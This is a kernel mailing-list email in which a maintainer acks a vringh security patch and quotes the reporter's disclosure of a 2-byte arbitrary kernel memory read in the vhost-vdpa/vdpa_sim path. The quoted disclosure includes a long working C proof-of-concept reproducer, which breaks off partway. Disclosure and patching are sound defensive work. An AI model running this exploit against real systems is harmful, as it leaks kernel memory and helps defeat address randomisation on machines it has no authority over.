Received: from us-smtp-delivery-124.mimecast.com (us-smtp-delivery-124.mimecast.com [170.10.133.124])
	(using TLSv1.2 with cipher ECDHE-RSA-AES256-GCM-SHA384 (256/256 bits))
	(No client certificate requested)
	by smtp.subspace.kernel.org (Postfix) with ESMTPS id E5D7746D554
	for <virtualization@lists.linux.dev>; Fri, 16 Oct 2026 11:12:23 +0000 (UTC)
Authentication-Results: smtp.subspace.kernel.org; arc=none smtp.client-ip=170.10.133.124
ARC-Seal:i=1; a=rsa-sha256; d=subspace.kernel.org; s=arc-20240116;
	t=1792149150; cv=none; b=tuTyaE3l0wWo5t2QfJqUTWQ2MtZWCfuA+ObGe1yCSPpJN3QO1ZKRIUa7II2tgavI3tCSx31xQYUHun8/3RT3cpbENnfp4D8MUjcNOMjYa+lkjlKCewv0SUQe5SsileyOBJRC9IOoIWDnhGDTrvXytdyY2d7cGl+jjX6OlX+4OCQ=
ARC-Message-Signature:i=1; a=rsa-sha256; d=subspace.kernel.org;
	s=arc-20240116; t=1792149150; c=relaxed/simple;
	bh=VhDQGRkg+2ZVM/UgvYdRSkFupwGzW8mNHAagdVjZQwM=;
	h=MIME-Version:References:In-Reply-To:From:Date:Message-ID:Subject:
	 To:Cc:Content-Type; b=Yb3/9LxtyNVZeuNrFRVM4ZYE4ZMakNdNBYf9Ht06R8VmgyNMCjvTPmdaT+cF0covqrEEKuTT2OhIgXariN7ghKRfEiUnun0p2CGisa0Xet8eGzfTfxUVPTgByjNDzBKnYNSMDmKf6ALFsv2xasWLAoFPjWIQXxjG1IN2qaSzMMU=
ARC-Authentication-Results:i=1; smtp.subspace.kernel.org; dmarc=pass (p=quarantine dis=none) header.from=redhat.com; spf=pass smtp.mailfrom=redhat.com; dkim=pass (1024-bit key) header.d=redhat.com header.i=@redhat.com header.b=NzGuzNo5; arc=none smtp.client-ip=170.10.133.124
Authentication-Results: smtp.subspace.kernel.org; dmarc=pass (p=quarantine dis=none) header.from=redhat.com
Authentication-Results: smtp.subspace.kernel.org; spf=pass smtp.mailfrom=redhat.com
Authentication-Results: smtp.subspace.kernel.org;
	dkim=pass (1024-bit key) header.d=redhat.com header.i=@redhat.com header.b="NzGuzNo5"
DKIM-Signature: v=1; a=rsa-sha256; c=relaxed/relaxed; d=redhat.com;
	s=mimecast20190719; t=1792149142;
	h=from:from:reply-to:subject:subject:date:date:message-id:message-id:
	 to:to:cc:cc:mime-version:mime-version:content-type:content-type:
	 content-transfer-encoding:content-transfer-encoding:
	 in-reply-to:in-reply-to:references:references;
	bh=EAPDwu0HQ+c7g0R3BIjt/VXpcO6E+MbQhc0mcItEffQ=;
	b=NzGuzNo5HyFGmXM0344UJXmoH+/sBzj+xQR0YRGDwHo6KHz8XlgB+ktIz9BdAGG6y3krya
	79jyKn/I3wy/f5D1l+UIef9VImNsyaIdjz/72BFteUfkhARUkVXb4Qh0SDsfPAQXnABPCM
	enE2+bn5cetARdfXb/FFiFkmhwj3Uvo=
Received: from mail-yw1-f198.google.com (mail-yw1-f198.google.com
 [209.85.128.198]) by relay.mimecast.com with ESMTP with STARTTLS
 (version=TLSv1.3, cipher=TLS_AES_256_GCM_SHA384) id
 us-mta-424-Bjm6CD3pOnqvtQ0iej2qug-1; Fri, 16 Oct 2026 11:12:21 +0000
X-MC-Unique: Bjm6CD3pOnqvtQ0iej2qug-1
X-Mimecast-MFC-AGG-ID: Bjm6CD3pOnqvtQ0iej2qug_1792149141
Received: by mail-yw1-f198.google.com with SMTP id 00721157ae682-8b0e878f574so6517177b3.1
        for <virtualization@lists.linux.dev>; Fri, 16 Oct 2026 04:12:21 -0700 (PDT)
X-Google-DKIM-Signature: v=1; a=rsa-sha256; c=relaxed/relaxed;
        d=1e100.net; s=20260707; t=1792149141; x=1792753941;
        h=content-transfer-encoding:content-type:cc:to:subject:message-id
         :date:from:in-reply-to:references:mime-version:x-gm-gg
         :x-gm-message-state:from:to:cc:subject:date:message-id:reply-to
         :content-type;
        bh=EAPDwu0HQ+c7g0R3BIjt/VXpcO6E+MbQhc0mcItEffQ=;
        b=bECP5ATKIoSiWfGB+CqClbM9TgTErEWat/DROMdgdxz/QQDx6OJ3FFZjJUSCgwzYWE
         ufSm7PkgMBpWmJaNng/ouZrj4rOidJLKy7F4D5zbJID0MHJsPVbofuGkGI6YZUlvSAvA
         tJ1sf9SAmHhU0lFUDc/e/aJBHW/lyaEMI0MqsgRyGYMtc4HY5RbYbl+YHQSjYgv8zoPZ
         FxTiSoy6VhVsD2ZEA0anOJIUQi49z6SH2EOPgLJHAJDVx6BI+pEZs5Epw01KH5yhNOzx
         ZOTX7M39RAPPVbbyPbGiK2d5I/5odeQUYw1J/ObWR3qJDMoRzFKzSSM0WEASVCiha1gK
         Mw/w==
X-Forwarded-Encrypted: i=1; AKwUvBx1KpqIoysKGI72x2cZxU4qnzDRUHL02o4eI0ZPmPU3QZxFWozQ2Ryomvuyv7o42KKmI+jqL3UjT7pWWpPywQ==@lists.linux.dev
X-Gm-Message-State: AFq9FYK3G9YX2iYL/iAR2n2lz6lIbAre2bljiSVM3+Y7zq11WQdZ4Ked
	XR2eg3o38fD6LqlSitm4AdvtmankW7RdL2E7eXU33pg5l2gjXzwahHCGYq0LmfTe5m/trTPfpn+
	9g4fhmYkVt4P+DJzvpw7OBnvuWCcAWaay6avzl7+QEU/xstRMLhgd/5haO6dLEO2A6/U+KWCWC+
	rXaUkj1xFEqMwzLDiGWs8jUPMd9KLLhsrBAXjCIwKVXQ1LTMwIwqs=
X-Gm-Gg: AYBFou1XrnI3wPVwTHairlddYQ5t9FF9mbadEqHl2fzjhsOPHClTCR2E7f7uh6k6bVB
	BKjLBmSlgIPr6YEyCg1Atx3ucrdJ+dfY4gpKnqsu6bYxbH/ZTkujpQm1Go1nI+ITB19eUH12QbV
	ml/J3ppB1xujVoPc84uQGhWjo2y4PNfUVbAVZF7KmtBJ1l9hP0N1vBfKug58RAF7obf9vwdboqA
	xk4GHp6Rq2RgSMjWlA8fQLvf9/A3O+QGTYVaq2FjPSpCn1HHKcNSfRi4rc=
X-Received: by 2002:a05:690c:f04:b0:8a4:e89e:5185 with SMTP id 00721157ae682-8b0e2d6a7ebmr10020497b3.9.1792149140479;
        Fri, 16 Oct 2026 04:12:20 -0700 (PDT)
X-Received: by 2002:a05:690c:f04:b0:8a4:e89e:5185 with SMTP id
 00721157ae682-8b0e2d6a7ebmr10020317b3.9.1792149139869; Fri, 16 Oct 2026
 04:12:19 -0700 (PDT)
Precedence: bulk
X-Mailing-List: virtualization@lists.linux.dev
List-Id: <virtualization.lists.linux.dev>
List-Subscribe: <mailto:virtualization+subscribe@lists.linux.dev>
List-Unsubscribe: <mailto:virtualization+unsubscribe@lists.linux.dev>
MIME-Version: 1.0
References: <6ad09d48.81b1ab59.3da7fb.9fc9@mx.google.com> <CAJaqyWd67m8kEGf5Rpd5xmvohf6SmJo-nJ1UptTJsNCLXkXEhQ@mail.gmail.com>
In-Reply-To: <CAJaqyWd67m8kEGf5Rpd5xmvohf6SmJo-nJ1UptTJsNCLXkXEhQ@mail.gmail.com>
From: Eugenio Perez Martin <eperezma@redhat.com>
Date: Fri, 16 Oct 2026 13:11:42 +0200
X-Gm-Features: AclHuK9O2bjNKBZt7KAmkyuScDc7jSMhwz84eUnAW_d5Zyji4LYfImmyfp7IDAk
Message-ID: <CAJaqyWc9yf_KEvw3VZ6vM06xGJTK1vmAr0s+gPVy=iotfAWfBQ@mail.gmail.com>
Subject: Re: [PATCH] vringh: validate user address in the IOTLB use_va read helper
To: Haoran Wang <haoranwangsec@gmail.com>
Cc: mst@redhat.com, jasowangio@gmail.com, kvm@vger.kernel.org, 
	virtualization@lists.linux.dev, netdev@vger.kernel.org, 
	linux-kernel@vger.kernel.org, security@kernel.org
X-Mimecast-Spam-Score: 0
X-Mimecast-MFC-PROC-ID: L1CtrhbCraC-JWiMSoliNAZti3U4qtkYtO8cu8U1U2U_1792149141
X-Mimecast-Originator: redhat.com
Content-Type: text/plain; charset="UTF-8"
Content-Transfer-Encoding: quoted-printable

On Fri, Oct 16, 2026 at 1:10=E2=80=AFPM Eugenio Perez Martin
<eperezma@redhat.com> wrote:
>
> On Thu, Oct 15, 2026 at 11:30=E2=80=AFAM Haoran Wang <haoranwangsec@gmail=
.com> wrote:
> >
> > From c165d81ad210155e0ac8eff7a571d9e525c00113 Mon Sep 17 00:00:00 2001
> > From: Haoran Wang <haoranwangsec@gmail.com>
> > Date: Thu, 15 Oct 2026 16:59:32 +0800
> > Subject: [PATCH] vringh: validate user address in the IOTLB use_va read=
 helper
> >
> > getu16_iotlb() reads a 2-byte value from the address returned by
> > iotlb_translate() using __get_user(), which skips access_ok().
> > iotlb_translate() only performs an IOTLB interval lookup and does not
> > validate the address as a user pointer.  In the vhost-vdpa + vdpa_sim
> > use_va path, vdpa_sim's default passthrough IOTLB identity-maps the
> > whole address space and vdpasim_set_vq_address() stores the
> > controller-supplied vring address verbatim, so a controller with
> > CAP_NET_ADMIN can point the vring avail_user_addr at a kernel address.
> > On a vq kick the worker then dereferences that kernel address via
> > __get_user(), leaking 2 bytes of kernel memory per read; the value is
> > disclosed to dmesg by vringh_bad().
> >
> > get_user() is access_ok() + __get_user(), use it instead so a kernel
> > address is rejected with -EFAULT rather than dereferenced.
> >
> >
> > Signed-off-by: Haoran Wang <haoranwangsec@gmail.com>
>
> Acked-by: Eugenio P=C3=A9rez <eperezma@redhat.com>
>

Sorry, I forgot: It misses a Fixes: tag.

> > ---
> >
> > I'd like to report an issue in drivers/vhost/vringh.c:1216 (function
> > getu16_iotlb), found via static analysis of Linux 7.0.11 and verified
> > against the 7.2.10 source tree. I have reproduced the leak on an
> > unmodified 7.2.10 kernel.
> >
> > 1. Summary
> > getu16_iotlb() calls __get_user(tmp, (__virtio16 __user *)iov_base)
> > without an access_ok() check. iov_base originates from iotlb_translate(=
),
> > which only performs an IOTLB interval lookup (vhost_iotlb_itree_first) =
and
> > does not call access_ok(). In the vdpa_sim default passthrough mode the
> > entire address space is identity-mapped ([0, ULONG_MAX] -> 0), and
> > vdpasim_set_vq_address() stores the controller-supplied vring address
> > verbatim with no validation. A controller with CAP_NET_ADMIN can theref=
ore
> > set a vring avail_user_addr to a kernel address. On a vq kick the vdpa_=
sim
> > worker reads 2 bytes from that kernel address via __get_user (no
> > access_ok). Each vring iteration reads 2 bytes and the value is
> > repeatable, yielding an arbitrary-kernel-address 2-byte read. get_user(=
)
> > would have rejected a kernel address via access_ok(), while__get_user()=
 does
> > not.
> >
> > 2. Vulnerable code
> > - File: drivers/vhost/vringh.c:1216 (unchanged in 7.2.10)
> > - Function: getu16_iotlb
> > - Misused API: __get_user
> >
> > ```c
> > /* drivers/vhost/vringh.c:1216 - getu16_iotlb (IOTLB read helper, per v=
ring iteration) */
> > if (vrh->use_va) {
> >         ret =3D __get_user(tmp, (__virtio16 __user *)ivec.iov.iovec[0].=
iov_base); /* no access_ok */
> > }
> >
> > /* iov_base comes from iotlb_translate() (IOTLB lookup only, no access_=
ok) */
> > /* drivers/vdpa/vdpa_sim/vdpa_sim.c:157-159 - passthrough identity-maps=
 everything */
> > vhost_iotlb_add_range(&iommu, 0, ULONG_MAX, 0, VHOST_MAP_RW);
> > /* vdpa_sim.c:297 - set_vq_address stores the controller u64 verbatim, =
no validation */
> > vq->desc_addr =3D desc_area;   /* controller-controlled =3D kernel addr=
ess */
> > ```
> >
> > 3. Root cause
> > get_user() =3D access_ok() + __get_user(). __get_user() skips access_ok=
()
> > (it expands to __get_user_nocheck, which performs no check_range, where=
as
> > get_user/put_user expand to the check_range-bearing variants that rejec=
t
> > kernel addresses). In the vhost-vdpa + vdpa_sim use_va path, the vring
> > addresses supplied by the controller (driver_addr/desc_addr) flow throu=
gh
> > iotlb_translate(), which only does a vhost_iotlb_itree_first() interval
> > lookup. vdpa_sim's default passthrough IOTLB identity-maps the whole
> > address space, so any address passes the lookup. vdpasim_set_vq_address=
()
> > stores the controller's u64 with no user/kernel validation, and
> > vhost_vring_set_addr()'s access_ok is skipped in the vhost-vdpa path
> > because vq->private_data is never set. Consequently __get_user
> > dereferences an attacker-chosen kernel virtual address: the vdpa_sim
> > worker runs under kthread_use_mm() in the controller's mm with SMAP
> > disabled (STAC), and kernel addresses are mapped there, so 2 bytes of
> > kernel memory are read. With num=3D1, __vringh_get_head() sees head (th=
e
> > leaked u16) >=3D 1 and calls vringh_bad(), which printk's the leaked va=
lue
> > to dmesg, making the leak externally observable.
> >
> > 4. Affected versions
> > Present in: Linux 7.0.11. 7.2.10: still present, reproduced on 7.2.10 k=
ernel.
> >
> > 5. Trigger / Preconditions
> > CAP_NET_ADMIN + vdpa_sim (CONFIG_VDPA_SIM / VDPA_SIM_BLOCK) + use_va mo=
de.
> > The controller creates a vdpasim device, binds its mm (VHOST_SET_OWNER,
> > enabling use_va), negotiates VIRTIO_F_ACCESS_PLATFORM, sets the vring
> > avail_user_addr to a kernel address, enables the vq, sets DRIVER_OK, an=
d
> > kicks the vq. The worker then reads 2 bytes at the chosen kernel addres=
s.
> >
> > 6. Proof of Concept
> > Reproduced on Linux 7.2.10 tarball (config-only: CONFIG_KASAN=3Dy, VHOS=
T_VDPA=3Dy,
> > VDPA_SIM=3Dy, VDPA_SIM_BLOCK=3Dy). The trigger sets avail_user_addr =3D=
 &linux_banner
> > and reads avail->ring[0] (at banner+4). With num=3D1, the leaked u16 is=
 printk'd
> > by vringh_bad().
> >
> > Concrete reproduced evidence (7.2.10):
> > - dmesg: "vringh:" then "Guest says index 8312 > 1 is available"
> > - leaked value =3D 8312 =3D 0x2078 =3D linux_banner[4]=3D'x'(0x78) |
> >   (linux_banner[5]=3D' '(0x20) << 8)
> > - The expected value is independently computable from /proc/version (wh=
ich
> >   prints the same linux_banner): proc_version[4] | (proc_version[5] << =
8)
> >   =3D 0x78 | 0x2000 =3D 0x2078 =3D 8312. The reproduced value MATCHES.
> > - Across 3 boots the banner *address* changed under KASLR
> >   (0xffffffff8b517280 / 0xffffffffa3f17280 / 0xffffffff90717280; the
> >   trigger resolves it at runtime via /proc/kallsyms), while the leaked
> >   *content* was 8312 every time. KASLR only randomizes the address, the=
 2
> >   bytes read there are constant.
> >
> > So a CAP_NET_ADMIN controller can read 2 bytes at an arbitrary kernel
> > virtual address by setting a vring avail_user_addr to that address and
> > kicking the vdpa_sim worker. The value is disclosed to dmesg via
> > vringh_bad(). This is an arbitrary-kernel-address 2-byte read on an
> > 7.2.10 kernel.
> >
> > Reproducer (vringh_leak.c) -- runs in the QEMU guest as root
> > (CAP_NET_ADMIN):
> >
> > ```c
> > #define _GNU_SOURCE
> > #include <stdio.h>
> > #include <stdlib.h>
> > #include <string.h>
> > #include <unistd.h>
> > #include <fcntl.h>
> > #include <errno.h>
> > #include <stdint.h>
> > #include <sys/ioctl.h>
> > #include <sys/socket.h>
> > #include <sys/mman.h>
> > #include <linux/netlink.h>
> > #include <linux/genetlink.h>
> > #include <linux/vhost.h>
> > #include <linux/vdpa.h>
> > #include <sys/eventfd.h>
> >
> > #ifndef VHOST_VDPA
> > #define VHOST_VDPA 0xAF
> > #endif
> >
> > #ifndef VHOST_BACKEND_F_IOTLB_MSG_V2
> > #define VHOST_BACKEND_F_IOTLB_MSG_V2 0x1
> > #endif
> > #ifndef VHOST_BACKEND_F_IOTLB_BATCH
> > #define VHOST_BACKEND_F_IOTLB_BATCH 0x2
> > #endif
> > #ifndef VHOST_BACKEND_F_IOTLB_ASID
> > #define VHOST_BACKEND_F_IOTLB_ASID 0x3
> > #endif
> > #ifndef VHOST_BACKEND_F_ENABLE_AFTER_DRIVER_OK
> > #define VHOST_BACKEND_F_ENABLE_AFTER_DRIVER_OK 0x6
> > #endif
> >
> > static inline int nla_ok_(const struct nlattr *nla, int remaining)
> > {
> >         return remaining >=3D (int)sizeof(struct nlattr) &&
> >                nla->nla_len >=3D (int)sizeof(struct nlattr) &&
> >                nla->nla_len <=3D remaining;
> > }
> > static inline struct nlattr *nla_next_(const struct nlattr *nla, int *r=
emaining)
> > {
> >         int tot =3D (int)NLA_ALIGN(nla->nla_len);
> >         *remaining -=3D tot;
> >         return (struct nlattr *)((char *)nla + tot);
> > }
> > static inline void *nla_data_(const struct nlattr *nla)
> > {
> >         return (char *)nla + NLA_HDRLEN;
> > }
> >
> > #ifndef VDPA_GENL_NAME
> > #define VDPA_GENL_NAME "vdpa"
> > #endif
> > #ifndef VDPA_GENL_VERSION
> > #define VDPA_GENL_VERSION 1
> > #endif
> > #ifndef VDPA_CMD_DEV_NEW
> > #define VDPA_CMD_DEV_NEW 3
> > #endif
> > #ifndef VDPA_CMD_DEV_DEL
> > #define VDPA_CMD_DEV_DEL 4
> > #endif
> > #ifndef VDPA_ATTR_MGMTDEV_DEV_NAME
> > #define VDPA_ATTR_MGMTDEV_DEV_NAME 2
> > #endif
> > #ifndef VDPA_ATTR_DEV_NAME
> > #define VDPA_ATTR_DEV_NAME 4
> > #endif
> >
> > #define die(fmt, ...) do { fprintf(stderr, "FATAL: " fmt "\n", ##__VA_A=
RGS__); exit(1); } while (0)
> > #define xp(fmt, ...) do { int _e =3D errno; fprintf(stderr, "ERR " fmt =
" (%s)\n", ##__VA_ARGS__, strerror(_e)); } while (0)
> >
> > static int nlsock;
> > static __u32 nlseq =3D 0;
> >
> > static int nla_put_str(struct nlmsghdr *nlh, int len, int type, const c=
har *s)
> > {
> >         struct nlattr { __u16 nla_len; __u16 nla_type; } *nla;
> >         int sl =3D (int)strlen(s) + 1;
> >         int pl =3D NLA_HDRLEN + sl;
> >         int pad =3D NLA_ALIGN(sl) - sl;
> >         if (NLMSG_ALIGN(nlh->nlmsg_len) + NLA_ALIGN(pl) > (size_t)len) =
return -1;
> >         nla =3D (void *)nlh + NLMSG_ALIGN(nlh->nlmsg_len);
> >         nla->nla_len =3D (__u16)pl;
> >         nla->nla_type =3D (__u16)type;
> >         memcpy((char *)nla + NLA_HDRLEN, s, sl);
> >         nlh->nlmsg_len =3D NLMSG_ALIGN(nlh->nlmsg_len) + NLA_ALIGN(pl);
> >         (void)pad;
> >         return 0;
> > }
> >
> > static int genl_resolve_family(const char *name, __u16 *fam_id)
> > {
> >         char buf[1024];
> >         struct nlmsghdr *nlh =3D (void *)buf;
> >         struct genlmsghdr *gh;
> >         memset(buf, 0, sizeof(buf));
> >         nlh->nlmsg_len =3D NLMSG_LENGTH(sizeof(*gh));
> >         nlh->nlmsg_type =3D GENL_ID_CTRL;
> >         nlh->nlmsg_flags =3D NLM_F_REQUEST;
> >         nlh->nlmsg_seq =3D ++nlseq;
> >         gh =3D NLMSG_DATA(nlh);
> >         gh->cmd =3D CTRL_CMD_GETFAMILY;
> >         gh->version =3D 1;
> >         nla_put_str(nlh, sizeof(buf), CTRL_ATTR_FAMILY_NAME, name);
> >         struct sockaddr_nl dst =3D { .nl_family =3D AF_NETLINK };
> >         struct iovec iov =3D { .iov_base =3D nlh, .iov_len =3D nlh->nlm=
sg_len };
> >         struct msghdr msg =3D { .msg_name =3D &dst, .msg_namelen =3D si=
zeof(dst), .msg_iov =3D &iov, .msg_iovlen =3D 1 };
> >         if (sendmsg(nlsock, &msg, 0) < 0) { xp("sendmsg getfamily"); re=
turn -1; }
> >         char rbuf[4096];
> >         struct iovec riov =3D { .iov_base =3D rbuf, .iov_len =3D sizeof=
(rbuf) };
> >         struct msghdr rmsg =3D { .msg_name =3D &dst, .msg_namelen =3D s=
izeof(dst), .msg_iov =3D &riov, .msg_iovlen =3D 1 };
> >         ssize_t n =3D recvmsg(nlsock, &rmsg, 0);
> >         if (n < 0) { xp("recvmsg getfamily"); return -1; }
> >         struct nlmsghdr *r =3D (void *)rbuf;
> >         if (!NLMSG_OK(r, (size_t)n)) return -1;
> >         if (r->nlmsg_type =3D=3D NLMSG_ERROR) { struct nlmsgerr *e =3D =
NLMSG_DATA(r); fprintf(stderr, "genl getfamily error %d\n", e->error); retu=
rn -1; }
> >         int hlen =3D GENL_HDRLEN;
> >         struct nlattr *na =3D (void *)r + NLMSG_HDRLEN + hlen;
> >         int rem =3D (int)(r->nlmsg_len - NLMSG_HDRLEN - hlen);
> >         *fam_id =3D 0;
> >         for (; nla_ok_(na, rem); na =3D nla_next_(na, &rem)) {
> >                 if (na->nla_type =3D=3D CTRL_ATTR_FAMILY_ID) {
> >                         *fam_id =3D *(__u16 *)nla_data_(na);
> >                         return 0;
> >                 }
> >         }
> >         return -1;
> > }
> >
> > static int genl_dev_new(__u16 fam, const char *mgmtdev, const char *dev=
name)
> > {
> >         char buf[1024];
> >         struct nlmsghdr *nlh =3D (void *)buf;
> >         struct genlmsghdr *gh;
> >         memset(buf, 0, sizeof(buf));
> >         nlh->nlmsg_len =3D NLMSG_LENGTH(sizeof(*gh));
> >         nlh->nlmsg_type =3D fam;
> >         nlh->nlmsg_flags =3D NLM_F_REQUEST | NLM_F_ACK;
> >         nlh->nlmsg_seq =3D ++nlseq;
> >         gh =3D NLMSG_DATA(nlh);
> >         gh->cmd =3D VDPA_CMD_DEV_NEW;
> >         gh->version =3D VDPA_GENL_VERSION;
> >         if (nla_put_str(nlh, sizeof(buf), VDPA_ATTR_MGMTDEV_DEV_NAME, m=
gmtdev) < 0) return -1;
> >         if (nla_put_str(nlh, sizeof(buf), VDPA_ATTR_DEV_NAME, devname) =
< 0) return -1;
> >         struct sockaddr_nl dst =3D { .nl_family =3D AF_NETLINK };
> >         struct iovec iov =3D { .iov_base =3D nlh, .iov_len =3D nlh->nlm=
sg_len };
> >         struct msghdr msg =3D { .msg_name =3D &dst, .msg_namelen =3D si=
zeof(dst), .msg_iov =3D &iov, .msg_iovlen =3D 1 };
> >         if (sendmsg(nlsock, &msg, 0) < 0) { xp("sendmsg dev_new"); retu=
rn -1; }
> >         char rbuf[4096];
> >         struct iovec riov =3D { .iov_base =3D rbuf, .iov_len =3D sizeof=
(rbuf) };
> >         struct msghdr rmsg =3D { .msg_name =3D &dst, .msg_namelen =3D s=
izeof(dst), .msg_iov =3D &riov, .msg_iovlen =3D 1 };
> >         ssize_t n =3D recvmsg(nlsock, &rmsg, 0);
> >         if (n < 0) { xp("recvmsg dev_new"); return -1; }
> >         struct nlmsghdr *r =3D (void *)rbuf;
> >         if (!NLMSG_OK(r, (size_t)n)) return -1;
> >         if (r->nlmsg_type =3D=3D NLMSG_ERROR) {
> >                 struct nlmsgerr *e =3D NLMSG_DATA(r);
> >                 if (e->error =3D=3D 0)
> >                         return 0;
> >                 fprintf(stderr, "dev_new error %d (%s)\n", e->error, st=
rerror(-e->error));
> >                 return -1;
> >         }
> >         return 0;
> > }
> >
> > static int genl_dev_del(__u16 fam, const char *devname)
> > {
> >         char buf[1024];
> >         struct nlmsghdr *nlh =3D (void *)buf;
> >         struct genlmsghdr *gh;
> >         memset(buf, 0, sizeof(buf));
> >         nlh->nlmsg_len =3D NLMSG_LENGTH(sizeof(*gh));
> >         nlh->nlmsg_type =3D fam;
> >         nlh->nlmsg_flags =3D NLM_F_REQUEST | NLM_F_ACK;
> >         nlh->nlmsg_seq =3D ++nlseq;
> >         gh =3D NLMSG_DATA(nlh);
> >         gh->cmd =3D VDPA_CMD_DEV_DEL;
> >         gh->version =3D VDPA_GENL_VERSION;
> >         nla_put_str(nlh, sizeof(buf), VDPA_ATTR_DEV_NAME, devname);
> >         struct sockaddr_nl dst =3D { .nl_family =3D AF_NETLINK };
> >         struct iovec iov =3D { .iov_base =3D nlh, .iov_len =3D nlh->nlm=
sg_len };
> >         struct msghdr msg =3D { .msg_name =3D &dst, .msg_namelen =3D si=
zeof(dst), .msg_iov =3D &iov, .msg_iovlen =3D 1 };
> >         sendmsg(nlsock, &msg, 0);
> >         char rbuf[4096]; struct iovec riov =3D { .iov_base =3D rbuf, .i=
ov_len =3D sizeof(rbuf) };
> >         struct msghdr rmsg =3D { .msg_name =3D &dst, .msg_namelen =3D s=
izeof(dst), .msg_iov =3D &riov, .msg_iovlen =3D 1 };
> >         recvmsg(nlsock, &rmsg, 0);
> >         return 0;
> > }
> >
> > static unsigned long ksym(const char *want)
> > {
> >         FILE *f =3D fopen("/proc/kallsyms", "r");
> >         if (!f) return 0;
> >         char line[512];
> >         unsigned long a =3D 0;
> >         while (fgets(line, sizeof(line), f)) {
> >                 char type; char name[256];
> >                 if (sscanf(line, "%lx %c %255s", &a, &type, name) =3D=
=3D 3) {
> >                         if (strcmp(name, want) =3D=3D 0) { fclose(f); r=
eturn a; }
> >                 }
> >         }
> >         fclose(f);
> >         return 0;
> > }
> >
> > static int expected_leak(unsigned *out)
> > {
> >         FILE *f =3D fopen("/proc/version", "r");
> >         if (!f) return -1;
> >         char v[256];
> >         if (!fgets(v, sizeof(v), f)) { fclose(f); return -1; }
> >         fclose(f);
> >         int len =3D (int)strlen(v);
> >         if (len < 6) return -1;
> >         unsigned m =3D ((unsigned)(unsigned char)v[4]) | (((unsigned)(u=
nsigned char)v[5]) << 8);
> >         *out =3D m;
> >         fprintf(stderr, "[*] /proc version bytes[4,5] =3D 0x%02x 0x%02x=
  =3D> expected leak M =3D 0x%04x (%u)\n",
> >                 (unsigned char)v[4], (unsigned char)v[5], m, m);
> >         fprintf(stderr, "[*] /proc/version =3D %.40s\n", v);
> >         return 0;
> > }
> >
> > int main(int argc, char **argv)
> > {
> >         unsigned exp;
> >         if (expected_leak(&exp)) die("cannot read /proc/version");
> >         unsigned long banner =3D ksym("linux_banner");
> >         fprintf(stderr, "[*] linux_banner @ 0x%lx\n", banner);
> >         if (!banner) die("linux_banner not in /proc/kallsyms (need root=
)");
> >
> >         nlsock =3D socket(AF_NETLINK, SOCK_RAW, NETLINK_GENERIC);
> >         if (nlsock < 0) die("netlink socket");
> >         struct sockaddr_nl sa =3D { .nl_family =3D AF_NETLINK };
> >         if (bind(nlsock, (struct sockaddr *)&sa, sizeof(sa)) < 0) die("=
netlink bind");
> >         __u16 fam;
> >         if (genl_resolve_family(VDPA_GENL_NAME, &fam)) die("resolve gen=
l family 'vdpa' (CONFIG_VDPA?)");
> >         fprintf(stderr, "[*] genl family 'vdpa' id=3D%u\n", fam);
> >         if (genl_dev_new(fam, "vdpasim_blk", "sim0")) die("dev_new vdpa=
sim_blk (CONFIG_VDPA_SIM_BLOCK?)");
> >         fprintf(stderr, "[*] created vdpa device sim0 (vdpasim_blk)\n")=
;
> >
> >         char path[64]; int vfd =3D -1;
> >         for (int i =3D 0; i < 50; i++) {
> >                 snprintf(path, sizeof(path), "/dev/vhost-vdpa-%d", i);
> >                 vfd =3D open(path, O_RDWR | O_CLOEXEC);
> >                 if (vfd >=3D 0) break;
> >         }
> >         if (vfd < 0) die("open /dev/vhost-vdpa-*");
> >         fprintf(stderr, "[*] opened %s fd=3D%d\n", path, vfd);
> >
> >         int callfd =3D eventfd(0, EFD_CLOEXEC);
> >         int kickfd =3D eventfd(0, EFD_CLOEXEC);
> >         if (callfd < 0 || kickfd < 0) die("eventfd");
> >
> >         if (ioctl(vfd, VHOST_SET_OWNER)) die("VHOST_SET_OWNER");
> >
> >         __u64 bf =3D 0;
> >         if (ioctl(vfd, VHOST_GET_BACKEND_FEATURES, &bf)) xp("get_backen=
d_features");
> >         __u64 setbf =3D bf | (1ULL << VHOST_BACKEND_F_IOTLB_MSG_V2)
> >                        | (1ULL << VHOST_BACKEND_F_IOTLB_BATCH)
> >                        | (1ULL << VHOST_BACKEND_F_IOTLB_ASID)
> >                        | (1ULL << VHOST_BACKEND_F_ENABLE_AFTER_DRIVER_O=
K);
> >         if (ioctl(vfd, VHOST_SET_BACKEND_FEATURES, &setbf)) xp("set_bac=
kend_features");
> >
> >         __u64 feat =3D 0;
> >         if (ioctl(vfd, VHOST_GET_FEATURES, &feat)) die("get_features");
> >         __u64 ack =3D 0;
> >         ack |=3D (1ULL << VIRTIO_F_ACCESS_PLATFORM);
> >         ack |=3D (1ULL << VIRTIO_F_VERSION_1);
> >         ack |=3D (1ULL << VIRTIO_F_ANY_LAYOUT);
> >         ack &=3D feat;
> >         if (!(ack & (1ULL << VIRTIO_F_ACCESS_PLATFORM))) die("ACCESS_PL=
ATFORM not supported - no use_va?");
> >         if (ioctl(vfd, VHOST_SET_FEATURES, &ack)) die("set_features (ne=
ed ACCESS_PLATFORM)");
> >
> >         struct vhost_vring_state vs =3D { .index =3D 0, .num =3D 1 };
> >         if (ioctl(vfd, VHOST_SET_VRING_NUM, &vs)) die("set_vring_num");
> >
> >         size_t pg =3D 4096;
> >         void *descbuf =3D mmap(NULL, pg, PROT_READ|PROT_WRITE, MAP_SHAR=
ED|MAP_ANONYMOUS, -1, 0);
> >         void *usedbuf =3D mmap(NULL, pg, PROT_READ|PROT_WRITE, MAP_SHAR=
ED|MAP_ANONYMOUS, -1, 0);
> >         if (descbuf =3D=3D MAP_FAILED || usedbuf =3D=3D MAP_FAILED) die=
("mmap");
> >         memset(descbuf, 0, pg); memset(usedbuf, 0, pg);
> >
> >         struct vhost_vring_addr va =3D {0};
> >         va.index =3D 0;
> >         va.flags =3D 0;
> >         va.desc_user_addr  =3D (uintptr_t)descbuf;
> >         va.avail_user_addr =3D (uintptr_t)banner;   /* <-- KERNEL addre=
ss, the leak source */
> >         va.used_user_addr  =3D (uintptr_t)usedbuf;
> >         va.log_guest_addr  =3D 0;
> >         if (ioctl(vfd, VHOST_SET_VRING_ADDR, &va)) die("set_vring_addr =
(avail=3Dkernel addr rejected?)");
> >
> >         struct vhost_vring_state base =3D { .index =3D 0, .num =3D 0 };
> >         if (ioctl(vfd, VHOST_SET_VRING_BASE, &base)) die("set_vring_bas=
e");
> >
> >         struct vhost_vring_file cf =3D { .index =3D 0, .fd =3D callfd }=
;
